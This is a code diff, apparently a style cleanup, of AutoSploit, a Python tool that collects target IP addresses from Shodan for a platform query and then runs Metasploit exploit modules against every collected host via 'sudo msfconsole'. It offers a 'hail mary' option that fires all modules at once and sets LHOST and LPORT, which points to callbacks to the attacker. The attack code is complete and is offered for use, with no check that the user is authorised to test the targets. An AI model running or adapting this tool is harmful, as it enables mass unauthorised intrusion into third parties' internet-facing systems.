@@ -17,20 +17,21 @@ except NameError:
     raw_input = input  # Python 3
 
 try:
-    xrange          # Python 2
+    xrange             # Python 2
 except NameError:
-    xrange = range  # Python 3
+    xrange = range     # Python 3
 
 t = Terminal()
 
 # Global vars
-api           = ""
-query         = ""
-workspace     = ""
-local_port    = ""
-local_host    = ""
-configured    = False
+api = ""
+query = ""
+workspace = ""
+local_port = ""
+local_host = ""
+configured = False
 toolbar_width = 60
+
 
 # Logo
 def logo():
@@ -42,6 +43,7 @@ def logo():
 #--Version: 1.0.0                                    |_|
 ##############################################
 """))
+
 
 # Usage and legal.
 def usage():
@@ -84,6 +86,7 @@ def usage():
 +-----------------------------------------------------------------------+
 """)
 
+
 # Function that allows us to store system command
 # output in a variable
 def cmdline(command):
@@ -94,131 +97,131 @@ def cmdline(command):
     )
     return process.communicate()[0]
 
+
 def exploit(query):
-	global workspace
-	global local_port
-	global local_host
+    global workspace
+    global local_port
+    global local_host
 
-	os.system("clear")
-	logo()
+    os.system("clear")
+    logo()
 
-	sorted_modules = []
-	all_modules    = []
+    sorted_modules = []
+    all_modules = []
 
-	print("[" + t.green("+") + "]Sorting modules relevant to the specified platform.")
-	print("[" + t.green("+") + "]This may take a while...\n\n\n")
+    print("[" + t.green("+") + "]Sorting modules relevant to the specified platform.")
+    print("[" + t.green("+") + "]This may take a while...\n\n\n")
 
-	# Progress bar
-	sys.stdout.write("[%s]" % (" " * toolbar_width))
-	sys.stdout.flush()
-	sys.stdout.write("\b" * (toolbar_width+1))
+    # Progress bar
+    sys.stdout.write("[%s]" % (" " * toolbar_width))
+    sys.stdout.flush()
+    sys.stdout.write("\b" * (toolbar_width + 1))
 
-	with open( "modules.txt", "rb" ) as infile:
-		for i in xrange(toolbar_width):
-			time.sleep(0.1)
-			for lines in infile:
-				all_modules.append(lines)
-				if query in lines:
-					sorted_modules.append(lines)
+    with open("modules.txt", "rb") as infile:
+        for i in xrange(toolbar_width):
+            time.sleep(0.1)
+            for lines in infile:
+                all_modules.append(lines)
+                if query in lines:
+                    sorted_modules.append(lines)
 
-			# update the bar
-			sys.stdout.write('\033[94m' + "|" + '\033[0m')
-			sys.stdout.flush()
+            # update the bar
+            sys.stdout.write('\033[94m' + "|" + '\033[0m')
+            sys.stdout.flush()
 
+    print("\n\n\n[" + t.green("+") + "]AutoSploit sorted the following MSF modules based search query relevance.\n")
+    # Print out the sorted modules
+    for line in sorted_modules:
+        print("[" + t.cyan("-") + "]" + line)
 
-	print("\n\n\n[" + t.green("+") + "]AutoSploit sorted the following MSF modules based search query relevance.\n")
-	# Print out the sorted modules
-	for line in sorted_modules:
-		print("[" + t.cyan("-") + "]" + line)
+    # We'll give the user the option to run all modules in a 'hail mary' type
+    # of attack or allow a more directed approach with the sorted modules.
+    choice = raw_input("\n[" + t.magenta("?") + "]Run sorted or all modules against targets? [S]orted/[A]ll: ").lower()
 
-	# We'll give the user the option to run all modules in a 'hail mary' type of attack or allow
-	# a more directed approach with the sorted modules.
-	choice = raw_input("\n[" + t.magenta("?") + "]Run sorted or all modules against targets? [S]orted/[A]ll: ").lower()
-
-	if choice == 's':
-		with open( "hosts.txt", "rb" ) as host_list:
-			for rhosts in host_list:
-				for exploit in sorted_modules:
-					template = "sudo msfconsole -x 'workspace -a %s; setg LHOST %s; setg LPORT %s; setg VERBOSE true; setg THREADS 100; set RHOSTS %s; %s'" % (workspace, local_host, local_port, rhosts, exploit)
-					os.system(template)
-	elif choice == 'a':
-		with open( "hosts.txt", "rb" ) as host_list:
-			for rhosts in host_list:
-				for exploit in all_modules:
-					template = "sudo msfconsole -x 'workspace -a %s; setg LHOST %s; setg LPORT %s; setg VERBOSE true; setg THREADS 100; set RHOSTS %s; %s'" % (workspace, local_host, local_port, rhosts, exploit)
-					os.system(template)
-	else:
-		print("[" + t.red("!") + "]Unhandled Option. Defaulting to Main Menu")
+    if choice == 's':
+        with open("hosts.txt", "rb") as host_list:
+            for rhosts in host_list:
+                for exploit in sorted_modules:
+                    template = "sudo msfconsole -x 'workspace -a %s; setg LHOST %s; setg LPORT %s; setg VERBOSE true; setg THREADS 100; set RHOSTS %s; %s'" % (
+                    workspace, local_host, local_port, rhosts, exploit)
+                    os.system(template)
+    elif choice == 'a':
+        with open("hosts.txt", "rb") as host_list:
+            for rhosts in host_list:
+                for exploit in all_modules:
+                    template = "sudo msfconsole -x 'workspace -a %s; setg LHOST %s; setg LPORT %s; setg VERBOSE true; setg THREADS 100; set RHOSTS %s; %s'" % (
+                    workspace, local_host, local_port, rhosts, exploit)
+                    os.system(template)
+    else:
+        print("[" + t.red("!") + "]Unhandled Option. Defaulting to Main Menu")
 
 
 # Function to gather target hosts from Shodan
 def targets(clobber=True):
-	global query
+    global query
 
-	os.system("clear")
-	logo()
+    os.system("clear")
+    logo()
 
-	print("[" + t.green("+") + "]Please provide your platform specific search query.")
-	print("[" + t.green("+") + "]I.E. 'IIS' will return a list of IPs belonging to IIS servers.")
+    print("[" + t.green("+") + "]Please provide your platform specific search query.")
+    print("[" + t.green("+") + "]I.E. 'IIS' will return a list of IPs belonging to IIS servers.")
 
-	while True:
-		query = raw_input("\n<" + t.cyan("PLATFORM") + ">$ ")
+    while True:
+        query = raw_input("\n<" + t.cyan("PLATFORM") + ">$ ")
 
-		if query == "":
-			print("[" + t.red("!") + "]Query cannot be null.")
-		else:
-			break
+        if query == "":
+            print("[" + t.red("!") + "]Query cannot be null.")
+        else:
+            break
 
-	print("[" + t.green("+") + "]Please stand by while results are being collected...\n\n\n")
-	time.sleep(1)
+    print("[" + t.green("+") + "]Please stand by while results are being collected...\n\n\n")
+    time.sleep(1)
 
-	try:
-		result = api.search(query)
-	except Exception as e:
-		print("\n[" + t.red("!") + "]Critical. An error was raised with the following error message.\n")
-		print(e)
+    try:
+        result = api.search(query)
+    except Exception as e:
+        print("\n[" + t.red("!") + "]Critical. An error was raised with the following error message.\n")
+        print(e)
 
-		sys.exit(0)
+        sys.exit(0)
 
-	# Setup progress bar
-	sys.stdout.write("[%s]" % (" " * toolbar_width))
-	sys.stdout.flush()
-	sys.stdout.write("\b" * (toolbar_width+1))
+    # Setup progress bar
+    sys.stdout.write("[%s]" % (" " * toolbar_width))
+    sys.stdout.flush()
+    sys.stdout.write("\b" * (toolbar_width + 1))
 
-	if clobber == True:
-		with open('hosts.txt', 'wb') as log:
-			for i in xrange(toolbar_width):
-				time.sleep(0.1)
-				for service in result['matches']:
-					log.write(service['ip_str'])
-					log.write("\n")
-
-				# update the bar
-				sys.stdout.write('\033[94m' + "|" + '\033[0m')
-				sys.stdout.flush()
-
-		hostpath = os.path.abspath("hosts.txt")
-
-		print("\n\n\n[" + t.green("+") + "]Done.")
-		print("[" + t.green("+") + "]Host list saved to " + hostpath)
-
-	else:
-		with open( "hosts.txt", "ab" ) as log:
-			for i in xrange(toolbar_width):
-				time.sleep(0.1)
-				for service in result['matches']:
-					log.write(service['ip_str'])
-					log.write("\n")
+    if clobber:
+        with open('hosts.txt', 'wb') as log:
+            for i in xrange(toolbar_width):
+                time.sleep(0.1)
+                for service in result['matches']:
+                    log.write(service['ip_str'])
+                    log.write("\n")
 
                 # update the bar
                 sys.stdout.write('\033[94m' + "|" + '\033[0m')
                 sys.stdout.flush()
 
-		hostpath = os.path.abspath("hosts.txt")
+        hostpath = os.path.abspath("hosts.txt")
 
-		print("\n\n\n[" + t.green("+") + "]Done.")
-		print("[" + t.green("+") + "]Hosts appended to list at " + hostpath)
+        print("\n\n\n[" + t.green("+") + "]Done.")
+        print("[" + t.green("+") + "]Host list saved to " + hostpath)
+    else:
+        with open("hosts.txt", "ab") as log:
+            for i in xrange(toolbar_width):
+                time.sleep(0.1)
+                for service in result['matches']:
+                    log.write(service['ip_str'])
+                    log.write("\n")
 
+        # update the bar
+        sys.stdout.write('\033[94m' + "|" + '\033[0m')
+        sys.stdout.flush()
+
+        hostpath = os.path.abspath("hosts.txt")
+
+        print("\n\n\n[" + t.green("+") + "]Done.")
+        print("[" + t.green("+") + "]Hosts appended to list at " + hostpath)
 
 
 # Function to define metasploit settings
